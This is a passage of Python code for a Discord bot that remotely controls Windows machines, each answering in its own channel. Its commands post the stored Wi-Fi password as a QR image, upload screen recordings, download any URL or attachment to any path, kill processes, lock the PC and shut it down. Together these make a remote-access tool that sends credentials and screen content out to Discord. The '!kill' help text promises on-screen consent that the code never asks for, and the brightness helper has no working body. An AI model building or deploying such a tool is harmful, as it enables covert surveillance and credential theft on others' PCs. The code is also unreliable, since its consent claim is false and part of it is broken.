@bot.command(name="wifiqr", help="Generate a QR code for the current Wi-Fi (scan with phone).")
async def cmd_wifiqr(ctx: commands.Context):
    global MY_CHANNEL_ID

    # Only respond if the command is from THIS PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return  # Exit if the command is from the wrong channel

    await ctx.typing()
    try:
        ssid, key, auth = await asyncio.to_thread(_get_current_wifi_ssid_and_password)
        path = await asyncio.to_thread(_make_wifi_qr_png_to_temp, ssid, key, auth)
        try:
            await ctx.reply(
                content=f"**Wi-Fi:** `{ssid}`  |  Auth: `{auth}`" + ("" if not key else "  |  Password included"),
                file=discord.File(path, filename=os.path.basename(path)),
            )
        finally:
            try:
                os.remove(path)
            except Exception:
                pass
    except Exception as e:
        await ctx.reply(f"❌ Could not create Wi-Fi QR: `{e}`")

@bot.command(name="lock", help="Lock the workstation immediately.")
async def cmd_lock(ctx: commands.Context):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        if os.name != "nt":
            raise RuntimeError("Lock is Windows-only.")
        ok = ctypes.windll.user32.LockWorkStation()
        if not ok:
            raise RuntimeError("LockWorkStation failed.")
        await ctx.reply("🔒 Screen locked.")
    except Exception as e:
        await ctx.reply(f"❌ {e}")

@bot.command(name="shutdown", help="Shutdown Windows. Usage: !shutdown now | !shutdown <seconds> | !shutdown cancel")
async def cmd_shutdown(ctx: commands.Context, when: str = "now"):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        if os.name != "nt":
            raise RuntimeError("Shutdown is Windows-only.")
        w = when.strip().lower()
        if w in {"cancel", "abort"}:
            subprocess.run(["shutdown", "/a"], check=True)
            return await ctx.reply("🛑 Shutdown aborted.")
        if w in {"now", "0"}:
            subprocess.run(["shutdown", "/s", "/t", "0"], check=True)
            return await ctx.reply("⚠️ Shutting down now.")
        # seconds
        secs = int(w)
        if secs < 0:
            secs = 0
        subprocess.run(["shutdown", "/s", "/t", str(secs)], check=True)
        await ctx.reply(f"⚠️ Shutdown scheduled in {secs} seconds. Use `!shutdown cancel` to abort.")
    except ValueError:
        await ctx.reply("❌ Usage: `!shutdown now` or `!shutdown <seconds>` or `!shutdown cancel`")
    except Exception as e:
        await ctx.reply(f"❌ {e}")

# ===================== Commands: !bs and !open =====================
@bot.command(name="brightness", aliases=["bs"], help="Set screen brightness (0-100). Example: !bs 60")
async def cmd_brightness(ctx: commands.Context, brightness_level: int):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        if not (0 <= brightness_level <= 100):
            await ctx.reply("❌ Please provide a number between 0 and 100, e.g. `!bs 60`")
            return

        msg = await asyncio.to_thread(_set_brightness_windows, brightness_level)
        await ctx.reply(f"✅ {msg}")

    except Exception as e:
        await ctx.reply(f"❌ {e}")

def _set_brightness_windows(level: int) -> str:
    """
    Set internal display brightness on Windows using WMI (0-100).
    Works on most laptops; external monitors usually ignore this.
    """
    if os.name != "nt":
        raise RuntimeError("Brightness control is Windows-only.")
    if not (0 <= level <= 100):
        raise RuntimeError("Brightness must be between 0 and 100.")

@bot.command(name="open", help="Open a common app. Example: !open chrome")
async def cmd_open(ctx: commands.Context, appname: str = ""):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        # Let the helper validate. If appname is empty, it will raise with "Usage: ..."
        msg = await asyncio.to_thread(_open_app_windows, appname)
        await ctx.reply(f"✅ {msg}")
    except Exception as e:
        text = str(e)
        if text.startswith("Usage:"):
            # Show usage in inline-code style like the original:
            usage_inner = text[len("Usage:"):].strip()
            return await ctx.reply(f"Usage: `{usage_inner}`")
        # Fallback for other errors (unknown app, launch failure, etc.)
        await ctx.reply(f"❌ {text}")  

# ---- NEW: !kill command (list processes or kill by PID) ----
@bot.command(
    name="kill",
    help="Manage apps safely: `!kill list` (uploads only REAL apps) or `!kill <PID>` (asks on-screen consent)."
)
async def cmd_kill(ctx: commands.Context, arg: str = ""):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    arg = (arg or "").strip()

    # ----- LIST (upload file of whitelisted apps) -----
    if arg.lower() == "list" or arg == "":
        await ctx.typing()
        try:
            rows = await asyncio.to_thread(_list_whitelisted_apps_windows)
            if not rows:
                return await ctx.reply("ℹ️ No whitelisted apps found running.")
            path = await asyncio.to_thread(_write_proc_list_to_temp, rows)
            try:
                await ctx.reply(
                    content=(f"**Apps on {PC_NAME}** (whitelisted)\n"
                             "Use `!kill <PID>` to request closing one (asks for consent on this PC)."),
                    file=discord.File(path, filename=os.path.basename(path)),
                )
            finally:
                try: os.remove(path)
                except Exception: pass
        except Exception as e:
            await ctx.reply(f"❌ Could not list apps: `{e}`")
        return

    # ----- KILL BY PID (only if that PID is a whitelisted app; with consent) -----
    try:
        pid = int(arg)
        if pid <= 0:
            raise ValueError
    except ValueError:
        return await ctx.reply("❌ Usage: `!kill list` **or** `!kill <PID>`")

    row = await asyncio.to_thread(_get_proc_row_by_pid, pid)
    if not row:
        return await ctx.reply(f"❌ PID {pid} not found.")

    name = _csv_field(row, "Image Name", "Nom de l’image").strip().lower()
    title = _csv_field(row, "Window Title", "Titre de la fenêtre").strip().lower()

    # Enforce whitelist: either EXE is whitelisted or title matches our hints
    is_allowed = (name in _WHITELIST_EXE) or (title and any(h in title for h in _TITLE_HINTS_LOWER))
    if not is_allowed:
        return await ctx.reply("🛑 That PID is not a whitelisted app. Run `!kill list` and choose a PID from there.")

    # Terminate
    await ctx.typing()
    try:
        msg = await asyncio.to_thread(_kill_process_windows_by_pid, pid)
        await ctx.reply(f"✅ {msg}")
    except Exception as e:
        await ctx.reply(f"❌ {e}")

@bot.command(name="recordscreen", aliases=["rec"], help="Record the screen for N seconds. Example: !recordscreen 15")
async def cmd_recordscreen(ctx: commands.Context, seconds: int = 10):
    global MY_CHANNEL_ID
    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    # Basic validation
    if seconds < 1 or seconds > 300:
        return await ctx.reply("❌ Choose a duration between **1** and **300** seconds. Example: `!recordscreen 20`")

    await ctx.typing()
    try:
        await ctx.reply(f"⏳ Starting recording in 3 seconds for **{seconds}s**…")
        await asyncio.sleep(3)

        # Record in a worker thread (blocking ffmpeg)
        path = await asyncio.to_thread(_record_screen_to_mp4, seconds)

        # Try to upload
        try:
            await ctx.reply(
                content=f"✅ Screen recording finished ({seconds}s).",
                file=discord.File(path, filename=os.path.basename(path)),
            )
        finally:
            try:
                os.remove(path)
            except Exception:
                pass

    except subprocess.CalledProcessError as e:
        await ctx.reply(f"❌ ffmpeg error: `{e}`")
    except discord.HTTPException as e:
        # Likely file too large for Discord
        await ctx.reply(f"❌ Upload failed: `{e}` (file may be too large). Try a shorter duration.")
    except Exception as e:
        await ctx.reply(f"❌ Recording failed: `{e}`")

@bot.command(
    name="upload",
    help='Save a URL or attached file to this PC. Usage: !upload "<URL>" [desktop|downloads|documents|pictures|music|videos|temp|<path>[\\<name>]]  '
         'Or attach a file and run: !upload [target]'
)
async def cmd_upload(ctx: commands.Context, *, args: str = ""):
    global MY_CHANNEL_ID

    # Only respond if the command is from this PC's designated channel
    if ctx.channel.id != MY_CHANNEL_ID:
        return

    await ctx.typing()
    try:
        import shlex

        parts = shlex.split(args) if args else []

        # If an attachment is present, it wins; optional target may be first arg
        if ctx.message.attachments:
            att = ctx.message.attachments[0]
            data = await att.read()
            suggested = att.filename or f"upload_{_ts_stamp_upload()}"
            target_spec = parts[0] if parts else None
            save_path = await asyncio.to_thread(upload_save_attachment, data, suggested, target_spec)
            return await ctx.reply(f"✅ Saved attachment **{os.path.basename(save_path)}** to:\n```\n{save_path}\n```")

        # Otherwise expect a URL (+ optional target)
        if not parts:
            return await ctx.reply(
                "❌ Usage: `!upload \"<URL>\" [desktop|downloads|documents|pictures|music|videos|temp|<path>[\\<name>]]` "
                "or attach a file and run `!upload [target]`"
            )

        url = parts[0]
        target_spec = parts[1] if len(parts) >= 2 else None
        if not (url.startswith("http://") or url.startswith("https://")):
            return await ctx.reply("❌ First argument must be a valid http(s) URL (or attach a file).")

        save_path = await asyncio.to_thread(upload_download_url, url, target_spec)
        await ctx.reply(f"✅ Downloaded **{os.path.basename(save_path)}** to:\n```\n{save_path}\n```")

    except Exception as e:
        await ctx.reply(f"❌ Upload failed: `{e}`")

# ------------------- Run bot -------------------
bot.run(TOKEN)